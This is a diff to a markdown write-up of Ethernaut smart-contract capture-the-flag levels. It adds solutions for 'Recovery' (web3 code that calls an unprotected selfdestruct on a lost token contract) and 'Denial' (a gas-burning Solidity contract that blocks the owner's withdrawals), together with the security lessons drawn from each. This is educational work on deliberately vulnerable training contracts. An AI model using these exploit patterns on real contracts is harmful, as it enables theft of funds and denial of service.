@@ -1222,13 +1222,189 @@ Useful links:
     ](https://medium.com/coinmonks/delegatecall-calling-another-contract-function-in-solidity-b579f804178c)
     - EOA: Externally Owned Account
 
-### Level 17. Locked
+### Level 17. Recovery
 
-### Level 18. Recovery
+**Goal**: `player` has to retrieve the funds from the lost address of contract which was created using the `Recovery`'s first transaction.
 
-### Level 19. MagicNumber
+Useful links:
+
+- Basic [Etherscan](https://rinkeby.etherscan.io/) inspection
+- [Determining address of a new contract](https://swende.se/blog/Ethereum_quirks_and_vulns.html)
+
+Given contract:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import '@openzeppelin/contracts/math/SafeMath.sol';
+
+contract Recovery {
+
+  //generate tokens
+  function generateToken(string memory _name, uint256 _initialSupply) public {
+    new SimpleToken(_name, msg.sender, _initialSupply);
+
+  }
+}
+
+contract SimpleToken {
+
+  using SafeMath for uint256;
+  // public variables
+  string public name;
+  mapping (address => uint) public balances;
+
+  // constructor
+  constructor(string memory _name, address _creator, uint256 _initialSupply) public {
+    name = _name;
+    balances[_creator] = _initialSupply;
+  }
+
+  // collect ether in return for tokens
+  receive() external payable {
+    balances[msg.sender] = msg.value.mul(10);
+  }
+
+  // allow transfers of tokens
+  function transfer(address _to, uint _amount) public {
+    require(balances[msg.sender] >= _amount);
+    balances[msg.sender] = balances[msg.sender].sub(_amount);
+    balances[_to] = _amount;
+  }
+
+  // clean up after ourselves
+  function destroy(address payable _to) public {
+    selfdestruct(_to);
+  }
+}
+```
+
+If the address of the lost `SimpleToken` address is retrieved it's funds can be retrieved using the `destroy` method.
+
+The easiest way to solve this would be to copy the address of `Recovery` in [Etherscan (on Rinkeby network)](https://rinkeby.etherscan.io/) and inspect transactions in **Internal Txns** tab. Find the latest **Contract Creation** transaction and click through the same to get the address of created contract.
+
+Now simply call `destroy` method at that address.
+So, if `tokenAddr` is the retrieved address then:
+
+```js
+functionSignature = {
+  name: "destroy",
+  type: "function",
+  inputs: [
+    {
+      type: "address",
+      name: "_to",
+    },
+  ],
+};
+
+params = [player];
+
+data = web3.eth.abi.encodeFunctionCall(functionSignature, params);
+
+await web3.eth.sendTransaction({ from: player, to: tokenAddr, data });
+```
+
+Another way to get the lost address is by utilizing the fact that creation of addresses of Ethereum is deterministic and can be calculated by:
+
+```js
+keccack256(address, nonce);
+```
+
+where `address` is the address of contract that created the transaction and `nonce` is the number of contracts the creator address has created. You can read more [here](https://swende.se/blog/Ethereum_quirks_and_vulns.html) and [there](https://medium.com/coinmonks/ethernaut-lvl-18-recovery-walkthrough-how-to-retrieve-lost-contract-addresses-in-2-ways-aba54ab167d3).
+
+**_Key Security Takeaways_**
+
+- **Money laundering potential**: this [blog post](https://swende.se/blog/Ethereum_quirks_and_vulns.html) elaborates on the potential of using future contract addresses to hide money. Essentially, you can send Ethers to a deterministic address, but the contract there is currently nonexistent. These funds are effectively lost forever until you decide to create a contract at that address and regain ownership.
+- **You are not anonymous on Ethereum**: Anyone can follow your current transaction traces, as well as monitor your future contract addresses. This transaction pattern can be used to derive your real world identity.
+
+### Level 18. Magic Number
+
+### Level 19. Alien Codex
 
 ### Level 20. Denial
+
+**Goal**: `player` has to plant a denial of service attack such that `owner` is unable to withdraw funds through `withdraw` method.
+
+This is a simple wallet that drips funds over time. You can withdraw the funds slowly by becoming a withdrawing partner.
+
+If you can deny the owner from withdrawing funds when they call `withdraw()` (whilst the contract still has funds, and the transaction is of 1M gas or less) you will win this level.
+
+This contract's vulnerability comes from the `withdraw` method which does not mitigate against possible attack through execution of some unknown external contract code through `call` method. `call` did not set a gas limit that external call can use.
+
+The `call` method here can invoke the `receive` method of a malicious contract at `partner` address. And this is where we're going to eat up all gas so that `withdraw` function `revert`s with out of gas exception.
+
+Given contract:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import '@openzeppelin/contracts/math/SafeMath.sol';
+
+contract Denial {
+
+    using SafeMath for uint256;
+    address public partner; // withdrawal partner - pay the gas, split the withdraw
+    address payable public constant owner = address(0xA9E);
+    uint timeLastWithdrawn;
+    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances
+
+    function setWithdrawPartner(address _partner) public {
+        partner = _partner;
+    }
+
+    // withdraw 1% to recipient and 1% to owner
+    function withdraw() public {
+        uint amountToSend = address(this).balance.div(100);
+        // perform a call without checking return
+        // The recipient can revert, the owner will still get their share
+        partner.call{value:amountToSend}("");
+        owner.transfer(amountToSend);
+        // keep track of last withdrawal time
+        timeLastWithdrawn = now;
+        withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);
+    }
+
+    // allow deposit of funds
+    receive() external payable {}
+
+    // convenience function
+    function contractBalance() public view returns (uint) {
+        return address(this).balance;
+    }
+}
+```
+
+Solution:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.7;
+
+contract HackDenial {
+    // gas burner
+    uint256 n;
+    function burn() internal {
+        while (gasleft() > 0) {
+            n += 1;
+        }
+    }
+
+    receive() external payable {
+        burn();
+    }
+}
+```
+
+This level demonstrates that external calls to unknown contracts can still create denial of service attack vectors if a fixed amount of gas is not specified.
+
+If you are using a low level `call` to continue executing in the event an external call reverts, ensure that you specify a fixed gas stipend. For example `call.gas(100000).value()`.
+
+Typically one should follow the [checks-effects-interactions](https://docs.soliditylang.org/en/latest/security-considerations.html#use-the-checks-effects-interactions-pattern) pattern to avoid reentrancy attacks, there can be other circumstances (such as multiple external calls at the end of a function) where issues such as this can arise.
+
+_Note_: An external `CALL` can use at most 63/64 of the gas currently available at the time of the `CALL`. Thus, depending on how much gas is required to complete a transaction, a transaction of sufficiently high gas (i.e. one such that 1/64 of the gas is capable of completing the remaining opcodes in the parent call) can be used to mitigate this particular attack.
 
 ### Level 21. Shop
 
